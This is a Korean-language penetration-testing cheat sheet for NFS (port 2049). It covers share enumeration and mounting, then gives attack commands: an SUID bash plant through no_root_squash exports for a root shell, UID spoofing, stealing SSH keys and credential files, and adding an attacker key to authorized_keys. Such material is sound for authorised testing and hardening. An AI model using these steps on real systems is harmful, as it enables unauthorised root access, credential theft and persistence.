# NFS (2049)

Network File System. 네트워크 파일 공유. 설정이 잘못되면 중요 파일에 접근 가능.

---

## 열거

```bash
# 공유 목록 확인
showmount -e TARGET

# nmap
nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 TARGET
nmap --script=rpcinfo -p 111 TARGET

# rpcinfo로 NFS 서비스 확인
rpcinfo -p TARGET | grep nfs
```

---

## 마운트

```bash
# 마운트
mkdir /tmp/nfs
mount -t nfs TARGET:/share /tmp/nfs

# 특정 NFS 버전
mount -t nfs -o vers=3 TARGET:/share /tmp/nfs
mount -t nfs -o vers=2 TARGET:/share /tmp/nfs

# nolock 옵션 (NLM 문제 시)
mount -t nfs -o nolock TARGET:/share /tmp/nfs

# 마운트 해제
umount /tmp/nfs
```

---

## 공격

### Root Squashing 우회

`no_root_squash` 설정이 있으면 root 권한으로 파일 접근/생성 가능.

```bash
# /etc/exports 확인 (NFS 서버에서)
# /share *(rw,no_root_squash)  → root 접근 가능
# /share *(rw,root_squash)    → root → nfsnobody로 매핑됨

# no_root_squash인 경우: SUID binary 배치
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# target에서: /share/bash -p → root shell
```

### UID/GID 스푸핑

```bash
# NFS에서 파일 접근 권한은 UID/GID 기반
# target 파일의 소유자 UID를 확인하고 로컬에서 동일한 UID로 사용자 생성

# 파일 소유자 확인
ls -ln /tmp/nfs/

# 해당 UID로 로컬 사용자 생성
useradd -u 1001 fakeuser
su - fakeuser
cat /tmp/nfs/sensitive_file
```

### SSH 키 탈취/배치

```bash
# .ssh directory 접근 가능 시
cat /tmp/nfs/home/user/.ssh/id_rsa

# authorized_keys에 공격자 키 추가
echo "ATTACKER_PUBKEY" >> /tmp/nfs/home/user/.ssh/authorized_keys
```

---

## Nmap NSE

```bash
nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 TARGET
```

---

## enum4linux-ng / nmap 자동 열거

```bash
# enum4linux-ng 는 NFS 섹션 포함
enum4linux-ng -A TARGET

# showmount 가 막혔을 때 포트 111(portmapper) 로 우회 조회
rpcinfo -p TARGET
rpcinfo -s TARGET | grep nfs
```

---

## NFSv4 / Kerberos

NFSv4 는 포트 111(portmapper) 없이 2049 하나로 동작하고 Kerberos(`krb5`, `krb5i`, `krb5p`) 인증을 지원한다.

```bash
# NFSv4 마운트 (pseudo-root)
mount -t nfs4 TARGET:/ /tmp/nfs4

# Kerberos 인증
kinit user@DOMAIN.LOCAL
mount -t nfs4 -o sec=krb5 TARGET:/share /tmp/nfs4

# 익명 접근이 막혀도 AUTH_SYS 폴백이 허용되면 UID 스푸핑 가능
mount -t nfs -o vers=3,sec=sys TARGET:/share /tmp/nfs
```

---

## 일반적인 Exports 오설정

`/etc/exports` 에서 자주 보이는 취약 패턴:

```text
/share        *(rw,no_root_squash)        # 가장 치명적 - root 로 읽기/쓰기
/home         *(rw,no_root_squash,insecure)
/backup       *(rw,all_squash,anonuid=0)  # 익명이 root 로 매핑됨
/data         192.168.0.0/16(rw)          # 내부 전체 허용 - 피봇 후 접근 가능
```

### no_root_squash 권한 상승 (전체 흐름)

```bash
# 공격자 (NFS 클라이언트, root)
mount -t nfs TARGET:/share /mnt/nfs
cp /bin/bash /mnt/nfs/pwn
chmod +s /mnt/nfs/pwn                     # SUID 비트 설정

# target (NFS 서버 shell, 일반 사용자)
/share/pwn -p
# → euid=0(root) shell
```

### root_squash 우회 (all_squash + anonuid=0)

```bash
# anonuid=0 이면 익명 접근도 root 로 매핑되어 동일하게 SUID 기법 사용 가능
mount -t nfs TARGET:/share /mnt/nfs
cp /bin/bash /mnt/nfs/pwn && chmod +s /mnt/nfs/pwn
```

---

## 유의사항

!!! warning "로그"
    NFS 서버는 `rpc.mountd`, `rpc.nfsd` 로그를 남긴다. `/var/log/messages`, `journalctl -u nfs-server` 에 클라이언트 IP / 마운트 기록이 찍힘.

!!! tip "쓰기 권한 없이도 공격 가능"
    읽기 전용이어도 `.ssh/id_rsa`, `.bash_history`, `.aws/credentials` 등 credential 파일 유출이 주목표.
